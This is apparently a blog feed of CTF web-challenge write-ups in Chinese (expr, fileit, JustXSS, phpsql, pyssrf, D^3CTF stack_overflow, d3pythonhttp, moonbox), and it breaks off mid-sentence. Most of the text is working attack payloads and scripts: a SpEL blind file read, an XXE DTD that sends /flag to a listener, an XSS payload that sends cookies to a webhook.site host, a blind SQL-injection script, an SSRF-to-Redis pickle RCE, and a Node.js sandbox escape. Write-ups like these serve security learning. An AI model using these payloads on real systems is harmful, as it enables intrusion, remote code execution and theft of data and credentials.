        <content type="html"><![CDATA[<h1 id="expr"><a href="#expr" class="headerlink" title="expr"></a>expr</h1><p>SPEL注入，但经过测试可以发现不允许执行命令，也不能出网</p><p>因此通过延时判断文件内容侧信道，逐位读出flag文件，如果内容正确则延时</p><pre class="language-none"><code class="language-none">(&quot;a&quot;.class.forName(&quot;jav&quot;+&quot;a.nio.file.Files&quot;).readAllLines(&quot;a&quot;.class.forName(&quot;ja&quot;+&quot;va.nio.file.Paths&quot;).get(&quot;&#x2F;flag&quot;))).toString().substring(&#123;&#125;,&#123;&#125;).equals(&quot;[&quot;) andT(Thread).sleep(1000000000)</code></pre><h1 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h1><p><img src="image-1.png" alt="image-1.png"><br>根据源代码中的注释语句判断是 xxe 注入</p><p>在 <code>file_server</code> 上放置 <code>xxe.dtd</code>：</p><pre class="language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;  &lt;!ENTITY % int &quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;&lt;listen_server_ip&gt;:&lt;listen_server_port&gt;&#x2F;%file;&#39;&gt;&quot;&gt;</code></pre><p>并向服务器发送 Payload：</p><pre class="language-none"><code class="language-none">&lt;!DOCTYPE note[ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;&lt;file_server_ip&gt;:&lt;file_server_port&gt;&#x2F;xxe.dtd&quot;&gt; %remote;%int;%send; ]&gt;</code></pre><p>即可在 <code>listen_server</code> 上获得 flag</p><h1 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h1><p>在附件的 <code>baseinfoSet.json</code> 中找到加密后的密码</p><pre class="language-none"><code class="language-none">&quot;baseinfoSet_TELECOMPASSWORD&quot;: &quot;106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;&quot;,&quot;baseinfoSet_USERPASSWORD&quot;: &quot;106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;&quot;,</code></pre><p>搜索 <code>baseinfoSet_TELECOMPASSWORD</code> 加密算法的解密脚本：</p><pre class="language-none"><code class="language-none">orig&#x3D;&#39;106&amp;112&amp;101&amp;107&amp;127&amp;101&amp;104&amp;49&amp;57&amp;56&amp;53&amp;56&amp;54&amp;56&amp;49&amp;51&amp;51&amp;105&amp;56&amp;103&amp;106&amp;49&amp;56&amp;50&amp;56&amp;103&amp;102&amp;56&amp;52&amp;101&amp;104&amp;102&amp;105&amp;53&amp;101&amp;53&amp;102&amp;129&amp;&#39;l&#x3D;list(map(int,orig.split(&#39;&amp;&#39;)[:-1]))result&#x3D;[]for i in l:    if i &gt; 57:        i-&#x3D;4    result.append(chr(i))print(&#39;&#39;.join(result))</code></pre><p>运行后即可获得 flag</p><h1 id="JustXSS"><a href="#JustXSS" class="headerlink" title="JustXSS"></a>JustXSS</h1><p>预测 nonce 来进行 XSS</p><p>V8的 <code>Math.random()</code> 方法不是密码学安全的，可以通过历史记录来预测伪随机数生成器内部状<br>态，从而获取之后得到的值。</p><p>能拿到未来的nonce后就可以很方便的注入，但由于 Vue 的 <code>v-html</code> 是设置 <code>innerHTML</code> 来更新<br>DOM ，而事件侦听由被 CSP 给 ban 了，直接注入 <code>&lt;script&gt;</code> 也是不会执行的<br>这里就需要第二个 Trick，使用 <code>iframe</code> 绕过这个限制</p><p>POC:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;scriptnonce='$NONCE'>window.open('https://webhook.site/88da27db-7c1e-4fee-8410-9cef8bc08d2c?'+document.cookie)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><h1 id="Messy-Mongo"><a href="#Messy-Mongo" class="headerlink" title="Messy Mongo"></a>Messy Mongo</h1><p>利用后端 MongoDB $表达式解析 绕过前端 typescript 安全校验获得 flag</p><p>采用 <code>Update document</code> 和 <code>Aggregation pipeline</code> 的区别：</p><p>当传入的 <code>Update</code> 参数为数组时，MongoDB 将会把 <code>Update</code> 作为一个 <code>Aggregation pipeline</code> 进行解析，从而可以使用其Expr进行绕过。</p><p>POC 1：</p><pre class="language-none"><code class="language-none">&#123;    username: &#123;        $substr: [&#39;admin&#39;, 0, 5]    &#125;&#125;</code></pre><p>POC 2：<br><img src="image-2.png" alt="image-2.png"></p><pre class="language-none"><code class="language-none">&#123;    &quot;username&quot;: &#123; &quot;$toString&quot;: &quot;admin&quot; &#125;&#125;</code></pre><p>修改 ctfer 的 username 为 admin ，从而获取 admin 的 Todo lists ，获得 flag</p><h1 id="phpsql"><a href="#phpsql" class="headerlink" title="phpsql"></a>phpsql</h1><p>简单SQL注入</p><p>可以 <code>username=admin&amp;password=&#39;||1=1;#</code></p><p>当然，也可以:</p><pre class="language-none"><code class="language-none">&#123;&quot;password&quot;:&quot;1&quot;, &quot;username&quot;:f&quot;1&#39;||if(ascii(substr((sselectelect&#x2F;**&#x2F;group_concat(passwoorrd)&#x2F;**&#x2F;from&#x2F;**&#x2F;user),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)#&quot;&#125;</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">"https://prob06-frcwo2ol.contest.pku.edu.cn/login.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>    left <span class="token operator">=</span> <span class="token number">32</span>    right <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left<span class="token operator">+</span>right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1'||if(ascii(substr((sselectelect/**/group_concat(passwoorrd)/**/from/**/user),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(2),0)#"</span></span><span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token comment">#print(res.text) </span>            right <span class="token operator">=</span> mid         <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            left <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">if</span> left <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h1 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h1><p>访问 source 路径获得源码，发现存在 ssrf 的点且存在没有密码的 redis</p><p>结合题目描述得知版本为 python3.7，使用的 urllib 存在 http 头注入的问题，用这个漏洞（CVE-<br>2019-9947）对后台的 redis 进行攻击</p><p>构造key值</p><pre class="language-none"><code class="language-none">md5(&#39;http:&#x2F;&#x2F;1&#39;)&#x3D;22d474190b1889d3373fa4f9334e979c</code></pre><p>用脚本构造pickle的反序列数据</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cos system(S'command here'tR.'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>因为采用的是 flask 框架，最简单获得回显的方式就是写文件到静态目录</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cossystem(S'mkdir static'tR.'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>再将 flag 的内容重定向到 <code>static/1.txt</code> 中</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a<span class="token operator">=</span><span class="token triple-quoted-string string">b'''cossystem(S'cat /flag>static/1.txt'tR.'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>综上，先访问以下 url</p><pre class="language-none"><code class="language-none">&#x2F;?url&#x3D;127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydta2RpciBzdGF0aWMnCnRSLg%3d%3d%22%0d%0apaddins</code></pre><p>触发反序列化创建 static 目录</p><pre class="language-none"><code class="language-none">&#x2F;?url&#x3D;1</code></pre><p>再访问以下 url，将 flag 输出到 <code>static/1.txt</code></p><pre class="language-none"><code class="language-none">&#x2F;?url&#x3D;127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydjYXQgL2ZsYWc%2bc3RhdGljLzEudHh0Jwp0Ui4%3d%22%0d%0apaddins</code></pre><p>触发</p><pre class="language-none"><code class="language-none">&#x2F;?url&#x3D;1</code></pre><p>再访问 <code>/static/1.txt</code> ,获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NodeJS </tag>
            
            <tag> PHP </tag>
            
            <tag> Java </tag>
            
            <tag> SQL </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 D^3CTF WriteUp</title>
      <link href="/write-up/2024-d-3ctf-writeup/"/>
      <url>/write-up/2024-d-3ctf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h1><pre class="language-none"><code class="language-none">&#123;&quot;stdin&quot;:[&quot;0&#39;);this.constructor.constructor(&#39;return process.mainModule.require(\\&#39;child_process\\&#39;).execSync(\\&#39;cat &#x2F;flag\\&#39;).toString();&#39;)();&#x2F;&#x2F;&quot;]&#125;</code></pre><h1 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h1><p>python 前端使用 flask 框架 ，后端使用 web.py 框架，实际上是利用前后端不同框架对 HTTP 请求的解析和处理不一致</p><p>对于后端 web.py：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">backdoor</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> web<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># fix this backdoor</span>        <span class="token keyword">if</span> <span class="token string">b"BackdoorPasswordOnlyForAdmin"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"You are an admin!"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            data  <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">"Done!"</span></code></pre><p>后端 <code>web.data()</code> 处的解析为：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns the data sent with the request."""</span>    <span class="token keyword">if</span> <span class="token string">"data"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ctx<span class="token punctuation">:</span>        <span class="token keyword">if</span> ctx<span class="token punctuation">.</span>env<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"HTTP_TRANSFER_ENCODING"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"chunked"</span><span class="token punctuation">:</span>            ctx<span class="token punctuation">.</span>data <span class="token operator">=</span> ctx<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">"wsgi.input"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cl <span class="token operator">=</span> intget<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>env<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"CONTENT_LENGTH"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>            ctx<span class="token punctuation">.</span>data <span class="token operator">=</span> ctx<span class="token punctuation">.</span>env<span class="token punctuation">[</span><span class="token string">"wsgi.input"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span>cl<span class="token punctuation">)</span>    <span class="token keyword">return</span> ctx<span class="token punctuation">.</span>data</code></pre><p>其直接取出 <code>HTTP_TRANSFER_ENCODING</code> 字段与 <code>chunked</code> 进行比较</p><p>而前端 flask 处</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"chunked"</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">"&#123;&#125;\r\n&#123;&#125;\r\n0\r\n\r\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"BackdoorPasswordOnlyForAdmin"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"You are not an admin!"</span>conn<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token string">"/backdoor"</span><span class="token punctuation">,</span> body<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string">"Done!"</span></code></pre><p>使用 <code>Transfer-Encoding</code> 的 lower() 形式与 <code>chunked</code> 进行比较，此处产生了前后端差异</p><p>故可以构造 payload <code>Transfer-Encoding: Chunked </code> 使得请求包在前端 flask 处被解析为分块形式，而在后端 web.py 处被不被解析为分块形式</p><p>在绕过后端后门判定后即可使用常规 Pickle 反序列化来 RCE</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">R</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'index.GET=(lambda x: __import__("os").popen("cat /Secr3T_Flag").read());'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>R<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>注意此处由于靶机环境不出网，可以通过将 exec 替换 index.GET 来使用路由回显</p><p>Payload：</p><pre class="language-none"><code class="language-none">POST &#x2F;admin HTTP&#x2F;1.1 Host: python-backend:8080 Cookie: token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL3Byb2Mvc3lzL2tlcm5lbC9vc3R5cGUifQ.eyJ1c2VybmFtZSI6ImEiLCJpc2FkbWluIjp0cnVlfQ.QNAZtiSeedmA7mnPacjjkjBlf3gb5QXXjEy-9USsYAQ Transfer-Encoding: Chunked Content-Length: &#123;len(payload)&#125; &#123;hex(len(payload))[2:]&#125; &#123;payload.decode()&#125; 1c BackdoorPasswordOnlyForAdmin 0</code></pre><h1 id="moonbox"><a href="#moonbox" class="headerlink" title="moonbox"></a>moonbox</h1><p>根据这段代码</p><pre class="language-none"><code class="language-none">RUN apt-get install -y openssh-serverRUN echo &quot;PermitRootLogin yes&quot; &gt;&gt; &#x2F;etc&#x2F;ssh&#x2F;sshd_configRUN echo &quot;root:123456&quot; | chpasswd</code></pre><p>发现靶机使用了 root 弱密码并开启了 ssh 登录</p><p>对 moon-box-web jar 包 进行分析：<br><code>com.vivo.internet.moonbox.web/console/AgentController.java</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>vivo<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>moonbox<span class="token punctuation">.</span>web<span class="token punctuation">.</span>console</span><span class="token punctuation">;</span>    <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>vivo<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>moonbox<span class="token punctuation">.</span>common<span class="token punctuation">.</span>api<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">MoonBoxResult</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>vivo<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>moonbox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>console<span class="token punctuation">.</span></span><span class="token class-name">ConsoleAgentService</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>vivo<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>moonbox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>console<span class="token punctuation">.</span>vo<span class="token punctuation">.</span></span><span class="token class-name">ActiveHostInfoVo</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>vivo<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>moonbox<span class="token punctuation">.</span>service<span class="token punctuation">.</span>console<span class="token punctuation">.</span>vo<span class="token punctuation">.</span></span><span class="token class-name">AgentDetailVo</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span>  <span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>multipart<span class="token punctuation">.</span></span><span class="token class-name">MultipartFile</span></span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/api/console-agent"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token annotation punctuation">@RestController</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">ConsoleAgentService</span> consoleAgentService<span class="token punctuation">;</span>        <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"fileUpload"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">MoonBoxResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">></span></span> <span class="token function">uploadFile</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span> <span class="token class-name">MultipartFile</span> file<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"fileName"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> fileName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>consoleAgentService<span class="token punctuation">.</span><span class="token function">uploadAgentFile</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token class-name">MoonBoxResult</span><span class="token punctuation">.</span><span class="token function">createSuccess</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"fileLists"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">MoonBoxResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">AgentDetailVo</span><span class="token punctuation">></span><span class="token punctuation">></span></span> <span class="token function">getFileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">MoonBoxResult</span><span class="token punctuation">.</span><span class="token function">createSuccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>consoleAgentService<span class="token punctuation">.</span><span class="token function">getFileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"agentActiveHost"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">MoonBoxResult</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">ActiveHostInfoVo</span><span class="token punctuation">></span><span class="token punctuation">></span></span> <span class="token function">agentActiveHost</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"taskRunId"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> taskRunId<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">MoonBoxResult</span><span class="token punctuation">.</span><span class="token function">createSuccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>consoleAgentService<span class="token punctuation">.</span><span class="token function">getActiveHostByTaskRunId</span><span class="token punctuation">(</span>taskRunId<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>可以通过 <code>/api/console-agent/fileUpload</code> 路由上传文件</p><p>寻找可用调用链</p><pre class="language-none"><code class="language-none">com&#x2F;vivo&#x2F;internet&#x2F;moonbox&#x2F;web&#x2F;console&#x2F;RecordRunController.class#run &#x3D;&gt;com&#x2F;vivo&#x2F;internet&#x2F;moonbox&#x2F;service&#x2F;console&#x2F;impl&#x2F;AbstractTaskRunService.class#taskRun &#x3D;&gt;com&#x2F;vivo&#x2F;internet&#x2F;moonbox&#x2F;service&#x2F;console&#x2F;impl&#x2F;AgentDistributionServiceImpl.class#startAgent &#x3D;&gt;com&#x2F;vivo&#x2F;internet&#x2F;moonbox&#x2F;service&#x2F;console&#x2F;impl&#x2F;AgentDistributionServiceImpl.class#startServerAgent &#x3D;&gt;com&#x2F;vivo&#x2F;internet&#x2F;moonbox&#x2F;service&#x2F;console&#x2F;util&#x2F;AgentUtil.class#getRemoteAgentStartCommand</code></pre><p><code>getRemoteAgentStartCommand</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getRemoteAgentStartCommand</span><span class="token punctuation">(</span><span class="token class-name">String</span> sandboxDownLoadUrl<span class="token punctuation">,</span> <span class="token class-name">String</span> moonboxDownLoadUrl<span class="token punctuation">,</span> <span class="token class-name">String</span> appName<span class="token punctuation">,</span> <span class="token class-name">String</span> taskConfig<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> downLoadCommand <span class="token operator">=</span> <span class="token string">"curl -o sandboxDownLoad.tar "</span> <span class="token operator">+</span> sandboxDownLoadUrl <span class="token operator">+</span> <span class="token string">" &amp;&amp; curl -o moonboxDownLoad.tar "</span> <span class="token operator">+</span> moonboxDownLoadUrl<span class="token punctuation">;</span>    <span class="token class-name">String</span> startAgentCommand <span class="token operator">=</span> <span class="token string">" &amp;&amp; sh ~/.sandbox-module/bin/start-remote-agent.sh "</span> <span class="token operator">+</span> appName <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> taskConfig<span class="token punctuation">;</span>    <span class="token keyword">return</span> downLoadCommand <span class="token operator">+</span> <span class="token string">" &amp;&amp; rm -fr ~/sandbox &amp;&amp; rm -fr ~/.sandbox-module &amp;&amp;  tar  -xzf sandboxDownLoad.tar -C ~/ >> /dev/null &amp;&amp; tar  -xzf moonboxDownLoad.tar -C ~/ >> /dev/null &amp;&amp; dos2unix ~/sandbox/bin/sandbox.sh &amp;&amp; dos2unix ~/.sandbox-module/bin/start-remote-agent.sh &amp;&amp; rm -f moonboxDownLoad.tar sandboxDownLoad.tar"</span> <span class="token operator">+</span> startAgentCommand<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于 tar 